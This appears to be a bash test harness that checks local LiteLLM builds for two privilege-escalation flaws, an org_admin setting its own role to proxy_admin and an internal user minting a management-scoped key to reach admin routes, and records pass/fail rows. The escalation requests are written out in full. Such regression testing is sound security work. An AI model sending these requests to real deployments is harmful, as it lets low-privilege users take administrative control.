#!/usr/bin/env bash
# LiteLLM recall cells R1 (allowed_routes/key_type scope escalation, CVE-2026-47101)
# and R2 (self role change, CVE-2026-47102). A rung must already be up
# (testbed/litellm/up.sh <img>). Rows -> results/recall.csv with frozen signatures.
# Local only. Usage: 20_litellm_cell.sh <rung_label> <image_tag>
source "$(dirname "$0")/lib.sh"
NET="${NET:-pilot10}"
LABEL="${1:?rung label}"; IMG="${2:?image tag}"
MASTER="sk-pilot10-master"
BASE="http://p10-litellm:4000"
M="Authorization: Bearer $MASTER"
DIG="$(docker image inspect "$IMG" --format '{{range .RepoDigests}}{{.}}{{end}}' | sed 's/.*@//')"
out="$PILOT/results/recall.csv"
[ -f "$out" ] || echo "ts,gateway,rung,image_digest,advisory,subcell,verdict,observation,commit" > "$out"
row() { echo "$(date -u +%FT%TZ),litellm,$LABEL,$DIG,$1,$2,$3,\"$4\",$COMMIT" >> "$out"; printf '[%s/%s] %s — %s\n' "$1" "$2" "$3" "$4"; }
d() { docker run --rm --network "$NET" "$DRIVER_IMG" "$@"; }         # raw driver curl
code() { d -s -o /dev/null -w '%{http_code}' "$@"; }                 # status only
body() { d -s "$@"; }                                                # body

echo "=== R2 self role change (recall verdict = org_admin sub-cell) on $LABEL"
# org_admin sub-cell: a user who is org_admin of org O can reach /user/update for
# their own account (route gate needs organization_id in the body); the flaw is the
# missing field-level guard on user_role.
u="$(body -X POST "$BASE/user/new" -H "$M" -H 'Content-Type: application/json' -d '{"user_role":"internal_user"}')"
UUSER="$(echo "$u" | "$JQ" -r '.user_id // empty')"
org="$(body -X POST "$BASE/organization/new" -H "$M" -H 'Content-Type: application/json' -d '{"organization_alias":"r2org"}')"
OID="$(echo "$org" | "$JQ" -r '.organization_id // empty')"
if [ -z "$UUSER" ] || [ -z "$OID" ]; then
  row CVE-2026-47102 org_admin INVALID "setup failed (user=$UUSER org=$OID)"
else
  body -X POST "$BASE/organization/member_add" -H "$M" -H 'Content-Type: application/json' \
    -d "{\"organization_id\":\"$OID\",\"member\":{\"user_id\":\"$UUSER\",\"role\":\"org_admin\"}}" >/dev/null
  OAKEY="$(body -X POST "$BASE/key/generate" -H "$M" -H 'Content-Type: application/json' -d "{\"user_id\":\"$UUSER\"}" | "$JQ" -r '.key // empty')"
  OA="Authorization: Bearer $OAKEY"
  # positive control: org_admin updates a permitted own field (with org_id in body)
  pc="$(code -X POST "$BASE/user/update" -H "$OA" -H 'Content-Type: application/json' -d "{\"user_id\":\"$UUSER\",\"organization_id\":\"$OID\",\"user_email\":\"pc@local.test\"}")"
  # attempt self elevation
  resp="$(body -X POST "$BASE/user/update" -H "$OA" -H 'Content-Type: application/json' -d "{\"user_id\":\"$UUSER\",\"organization_id\":\"$OID\",\"user_role\":\"proxy_admin\"}")"
  st="$(code -X POST "$BASE/user/update" -H "$OA" -H 'Content-Type: application/json' -d "{\"user_id\":\"$UUSER\",\"organization_id\":\"$OID\",\"user_role\":\"proxy_admin\"}")"
  detail="$(echo "$resp" | "$JQ" -r '(.error.message // .detail // .error // .)|tostring' | tr -d '\n' | cut -c1-70)"
  newrole="$(body "$BASE/user/info?user_id=$UUSER" -H "$M" | "$JQ" -r '.user_info.user_role // .user_role // "unknown"')"
  if [ "$pc" != 200 ]; then
    row CVE-2026-47102 org_admin INVALID "positive control own-field update=$pc (route not reachable)"
  elif [ "$newrole" = proxy_admin ]; then
    row CVE-2026-47102 org_admin FAIL "self-elevation succeeded; role re-read=proxy_admin (http $st); posctl own-field update=$pc"
  elif [ "$st" = 403 ] && echo "$detail" | grep -qi 'proxy admins can modify user roles'; then
    row CVE-2026-47102 org_admin PASS "refused 403 [$detail]; role stayed $newrole; posctl own-field update=$pc"
  elif [ "$st" = 403 ]; then
    row CVE-2026-47102 org_admin INVALID "403 but detail!=signature [$detail]; posctl=$pc"
  else
    row CVE-2026-47102 org_admin INVALID "neither elevated nor signature-403 (http $st, role $newrole); posctl=$pc"
  fi
fi
# internal_user sub-cell (supporting only, H2): via API key the route gate blocks it.
iu="$(body -X POST "$BASE/user/new" -H "$M" -H 'Content-Type: application/json' -d '{"user_role":"internal_user"}')"
IUSER="$(echo "$iu" | "$JQ" -r '.user_id // empty')"; IKEY="$(echo "$iu" | "$JQ" -r '.key // empty')"
ist="$(code -X POST "$BASE/user/update" -H "Authorization: Bearer $IKEY" -H 'Content-Type: application/json' -d "{\"user_id\":\"$IUSER\",\"user_role\":\"proxy_admin\"}")"
irole="$(body "$BASE/user/info?user_id=$IUSER" -H "$M" | "$JQ" -r '.user_info.user_role // .user_role')"
row CVE-2026-47102 internal_user_support "$( [ "$irole" = proxy_admin ] && echo FAIL || echo noesc )" "api-key route gate http=$ist role=$irole (supporting, not the verdict)"

echo "=== R1 allowed_routes / key_type scope escalation on $LABEL"
# R1 mechanism (advisory): an internal_user creates a key with access to an
# admin-only route and the key then REACHES that route with 2xx (G13 signature).
# This cell mints the key_type=management bucket and then tests the actual reach
# against an admin route, with the plain internal_user key as the baseline and a
# read_only key as the positive control.
#   FAIL = the minted key reaches an admin-only route (2xx) the plain key cannot.
#   PASS = minted key refused on that route AND the elevated mint itself refused.
#   INVALID = no reach differential (the escalation does not grant admin access).
# Finding (review 2 P1, env/r1-reach-investigation.md): on this ladder the minted
# bucket reaches NO admin route (endpoint-level proxy_admin checks defeat the
# route-gate bypass; explicit allowed_routes blocked since 1.83.7), so R1 records
# INVALID on every rung rather than a vacuous mint-only FAIL.
iu2="$(body -X POST "$BASE/user/new" -H "$M" -H 'Content-Type: application/json' -d '{"user_role":"internal_user"}')"
IKEY2="$(echo "$iu2" | "$JQ" -r '.key // empty')"
if [ -z "$IKEY2" ]; then
  row CVE-2026-47101 base INVALID "internal_user key setup failed"
else
  IU="Authorization: Bearer $IKEY2"
  ADMIN_ROUTE="/user/list"   # admin-only; plain internal_user is refused
  # positive control: a non-admin CAN mint a safe-preset key and use a permitted route
  ro_key="$(body -X POST "$BASE/key/generate" -H "$IU" -H 'Content-Type: application/json' -d '{"key_type":"read_only"}' | "$JQ" -r '.key // empty')"
  pc_models="$( [ -n "$ro_key" ] && code "$BASE/models" -H "Authorization: Bearer $ro_key" || echo NA)"
  base_reach="$(code "$BASE$ADMIN_ROUTE" -H "$IU")"                    # plain internal_user baseline
  expl_code="$(code -X POST "$BASE/key/generate" -H "$IU" -H 'Content-Type: application/json' -d '{"allowed_routes":["/user/new"]}')"
  mint="$(body -X POST "$BASE/key/generate" -H "$IU" -H 'Content-Type: application/json' -d '{"key_type":"management"}')"
  mint_code="$(code -X POST "$BASE/key/generate" -H "$IU" -H 'Content-Type: application/json' -d '{"key_type":"management"}')"
  mkey="$(echo "$mint" | "$JQ" -r '.key // empty')"
  mbucket="$(echo "$mint" | "$JQ" -rc '.allowed_routes // empty')"
  child_reach="$( [ -n "$mkey" ] && code "$BASE$ADMIN_ROUTE" -H "Authorization: Bearer $mkey" || echo NA)"
  pcobs="posctl(read_only->/models)=$pc_models baseline(plain->$ADMIN_ROUTE)=$base_reach explMint=$expl_code mint=$mint_code bucket=$mbucket childReach=$child_reach"
  if [ -z "$ro_key" ] || [ "$pc_models" != 200 ]; then
    row CVE-2026-47101 reach INVALID "positive control failed: $pcobs"
  elif [ "$child_reach" = 200 ] && [ "$base_reach" != 200 ]; then
    row CVE-2026-47101 reach FAIL "minted key REACHES $ADMIN_ROUTE (2xx) that plain cannot — $pcobs"
  elif [ "$mint_code" = 403 ] && [ "$child_reach" != 200 ]; then
    row CVE-2026-47101 reach PASS "elevated mint refused and no admin-route reach — $pcobs"
  else
    row CVE-2026-47101 reach INVALID "no reach differential: elevated key does not reach an admin route (escalation primitive only) — $pcobs"
  fi
fi
echo "--- rows appended to $out"
